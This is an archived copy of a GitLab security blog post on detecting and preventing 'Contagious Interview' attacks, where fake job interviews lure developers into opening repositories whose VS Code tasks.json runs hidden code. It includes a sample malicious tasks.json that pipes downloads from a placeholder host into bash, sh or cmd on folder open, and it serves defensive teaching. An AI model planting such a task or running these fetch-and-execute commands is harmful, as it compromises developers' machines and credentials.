---
url: "https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/"
title: "How to detect and prevent Contagious Interview IDE attacks"
site: "GitLab"
published: "2026-05-04T12:00:00.000Z"
captured: "2026-11-02T18:21:37Z"
via: "live"
sha256: "9293081d1a7d64a34105017b750c156385577033ef87de2feb86bf7e7e72341c"
wayback: "https://web.archive.org/web/20260901091218/https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# How to detect and prevent Contagious Interview IDE attacks

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/>
> Snapshot: <https://web.archive.org/web/20260901091218/https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/>

To search repositories and projects, login to [gitlab.com](https://gitlab.com/users/sign_in/).

Suggestions

[GitLab Duo Agent Platform](https://about.gitlab.com/gitlab-duo-agent-platform/)[Code Suggestions (AI)](https://about.gitlab.com/gitlab-duo-agent-platform/)[CI/CD](https://about.gitlab.com/solutions/continuous-integration/)[GitLab on AWS](https://about.gitlab.com/partners/technology-partners/aws/)[GitLab on Google Cloud](https://about.gitlab.com/partners/technology-partners/google-cloud-platform/)[Why GitLab?](https://about.gitlab.com/why-gitlab/)

[GitLab Orbit is generally available. Increase agent accuracy and lower token costRead the announcement](https://about.gitlab.com/blog/gitlab-orbit-ga/)

Published on: May 4, 2026

7 min read

# How to detect and prevent Contagious Interview IDE attacks

Learn how we built custom controls that detect and prevent malware campaigns like those used for Contagious Interview and how to deploy them in your environment.

[Josh Feehs](https://about.gitlab.com/blog/authors/josh-feehs/)

[Austin Bollinger](https://about.gitlab.com/blog/authors/austin-bollinger/)

[security](https://about.gitlab.com/blog/tags/security/)[security research](https://about.gitlab.com/blog/tags/security-research/)[product](https://about.gitlab.com/blog/tags/product/)[tutorial](https://about.gitlab.com/blog/tags/tutorial/)

Recently, GitLab's Threat Intelligence team, part of the Security Operations team, published an [extensive article](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/) revealing North Korean tradecraft and detailing ways in which GitLab has tracked and disrupted these malicious actors. Security Operations here also includes our Security Incident Response Team (SIRT), Security Logging, Signals Intelligence, and Red Team. This tight collaboration across security disciplines allows us to take tips from threat intelligence, emulate relevant threat actors via Red and Purple Team exercises, and proactively build detection and prevention techniques based on that activity.

So, in parallel with the discovery of the North Korean tradecraft and associated [Contagious Interview](https://attack.mitre.org/groups/G1052/) threat campaign, we developed custom controls to prevent similar malware campaigns, specifically those which use IDE attacks. In this article, we share those controls as well as the techniques we use to protect our customers, support the broader security community, and further thwart these malicious actors.

## https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/#the-threat-intelligenceThe threat intelligence

The North Korean tradecraft article focused on a broad set of attacks, techniques, and Indicators of Compromise (IOCs) that North Korean state actors are actively using to conduct both broad and targeted attacks. One of [the attack paths noted](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#_2025-campaign-trends) was the use of Visual Studio Code tasks for malware distribution. The [Contagious Interview](https://attack.mitre.org/groups/G1052/) threat campaign often relies on fake interview processes to convince their victims to download and open a code repository, enabling attack via VS Code tasks.

[VS Code tasks](https://code.visualstudio.com/docs/debugtest/tasks) are a mechanism designed to automate common jobs that developers want to run when opening a repository, such as linting, building, packaging, testing, or deploying software systems. Via a simple configuration file within the repo, tasks.json, developers can automatically run code whenever they open their repository. Trust must be granted to the repository for these tasks to run.

Contagious Interview’s pretexts often rely on malicious repositories, so pivoting to using VS Code tasks for code execution is a simple continuation of their pretext. The target is prompted to download and open the malicious repository in VS Code (often for code review purposes as part of an interview). Because the victims believe they are interviewing for a job, the victim is under heavy pressure to “trust” the interviewer’s workspace, enabling the malicious task to run without their knowledge.

One example of a malicious tasks.json file is shown below. It is fairly simple — it detects the OS and downloads the next stage of the malware for that platform, using a curl | bash structure. Domains included are placeholders and not actual IOCs. Detailed IOCs for these actors were shared in our [previous blog post](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/#appendix-2-indicators-of-compromise).

```
        "version": "1.0.8",
  "tasks": [
    {
      "label": "env",
      "type": "shell",
      "osx": {
        "command": "curl 'https://www.example[.]com/settings/mac?flag=8' | bash"
      },
      "linux": {
        "command": "wget -q0- 'https://www.example[.]com/settings/linux?flag=8' | sh"
      },
      "windows": {
        "command": "curl https://www.example[.]com/settings/windows?flag=8 | cmd"
      },
      "problemMatcher": [],
      "presentation": {
        "reveal": "never",
        "echo": false,
        "focus": false,
        "close": true,
        "panel": "dedicated",
        "showReuseMessage": false
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]

```

This malicious code execution is then typically used to deploy infostealers, steal passwords and cryptocurrency, and ultimately establish persistence to abuse victims’ trusted accesses to corporate networks.

Once we understood how the threat actor was gaining initial code execution, we had a target for preventative measures to catch these attacks before GitLab workstations were targeted.

## https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/#multi-faceted-detection-and-preventionMulti-faceted detection and prevention

We always want to develop detective and preventative controls that are as “low level” as possible, since these types of detections are typically more difficult to bypass. Additionally, threat intelligence indicated that other projects that forked VS Code are also vulnerable to this malicious repository attack. So, instead of focusing specifically on a VS Code detection, we wanted to find the area “closest to the operating system” where this malicious code execution could be identified. This would allow our detection techniques to detect not only exploitation via VS Code tasks, but also attacks targeting using a VS Code fork or similar IDE written in Node that has background tasks.

Reviewing VS Code source, we identified that the node-pty.spawn() library call is used across the product when subprocesses need to be used. The [node-pty library](https://www.npmjs.com/package/node-pty) is incredibly popular, with over a million weekly downloads at time of writing. This library enables Node applications (including Electron applications such as VS Code) to fork subprocesses from a node context, and results in calls to its own binary, spawn-helper. When subprocesses are launched, spawn-helper is spawned as a child process of the Node application calling it.

After performing a Purple Team operation to emulate this specific attack path, we reviewed our Endpoint Detection and Response (EDR) telemetry to try to not only develop a strong detection for the emulated attack, but also to tune this detection to only alert on suspicious activity, and not on legitimate developer activity. We identified that spawn-helper is called in situations where VS Code wants to spawn tasks that occur in the background, without user visibility or interaction. Conversely, a Code Helper binary is called when new processes (such as the integrated Terminal) are launched in the foreground with user interaction.

This allows us to craft detections that only look for subprocesses spawned without the user’s knowledge, and avoid false positives that flag subprocesses a user might intentionally spawn while using their IDE.

As shown earlier, a commonly-seen malicious task contains commands that run a curl | <shell> from a task. Although curl | bash can be a legitimate way to install software like Homebrew, in our environment, it should never happen in the background without the user’s knowledge. This distinction allowed us to tune spawn-helper-based detections to not alert on every background task that ran, but to instead trigger only on behaviors that are uncommon and suspicious in our environment. Since implementing this detection technique, we have had no false positives, even though a large part of our organization uses VS Code daily.

Although this article has focused on detecting spawn-helper in your environment, this is only one of many layers of defense that you can implement in your organization to prevent and detect these IDE task-based attacks.

In addition to using EDR instrumentation to detect a malicious task at runtime, you can proactively harden your fleet against this type of attack by pushing global configs to disable task runs in VS Code. If that is too disruptive to your developers, you can also scan your environment to enumerate how often users use trusted workspaces and trusted workspace folders within their typical VS Code usage, and run education campaigns to help inform the company about the risks posed by this Contagious Interview attack path.

## https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/#summarySummary

GitLab Security Operations works around the clock to protect our customers and our company. With our tightly coupled security teams, we are able to produce actionable threat intelligence, leverage that threat intel to inform adversary emulation operations, and ultimately develop technical and procedural prevention and detection techniques that protect our customers and company.

As VS Code tasks continue to receive visibility in the security community, it’s possible that other threat actors will attempt to use this attack path for their own ends. We hope that this small example of the work we do to protect GitLab and our customers against Advanced Persistent Threats can inspire others to do the same, and to join us in our continued mission to disrupt these threat actors.

Follow our innovation and research on our [Security Labs site](https://about.gitlab.com/blog/categories/security-labs/).

##

Start your free

30-day GitLab trial

- GitLab Duo Agent Platform access
- Try our most advanced features
- Automate complex tasks with AI

[Get free trial](https://gitlab.com/-/trials/new?glm_content=default-saas-trial&glm_source=about.gitlab.com/blog/)

No credit card required.

## More to explore

[View all blog posts](https://about.gitlab.com/blog/)

[Security Labs

### Pillow CVE-2026-112900: How to find and fix it with GitLab](https://about.gitlab.com/blog/pillow-cve-find-and-fix-with-gitlab/)[Security Labs

### PHP2Shell: GitLab helps find and remediate critical PHP flaws](https://about.gitlab.com/blog/gitlab-helps-remediate-critical-php-flaws/)[Security Labs

### DeepSeek-Reasonix: How a poisoned config can hijack an AI coding agent](https://about.gitlab.com/blog/deepseek-reasonix-vulnerability-discovered/)

## We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/)

##

Start building faster today

See what your team can do with the intelligent orchestration platform for DevSecOps.

[Get your free trial](https://gitlab.com/-/trial_registrations/new?glm_content=default-saas-trial&glm_source=about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks)[Contact sales](https://about.gitlab.com/sales/)
